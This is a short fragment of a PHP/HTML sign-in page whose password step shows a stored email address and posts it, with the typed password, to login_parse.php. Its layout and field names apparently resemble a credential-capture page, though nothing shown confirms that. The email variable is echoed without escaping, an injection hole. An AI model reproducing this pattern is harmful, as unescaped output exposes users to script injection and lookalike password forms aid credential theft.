...
<body>
  ...
  <div class="wrapper">
  <form class="form-signin" method="POST" action="login_parse.php">
   ...
   <p> <br> <i class='fas fa-arrow-left'></i> <?php echo $attmail; ?></p><h4 class="form-signin-heading">Enter Password</h4>
      <input type="password" class="form-controll" name="nameps" placeholder="Password" required="" autofocus="" />
       <input type="text" class="form-control" name="nameail" value="<?php echo $attmail; ?>" hidden/>     
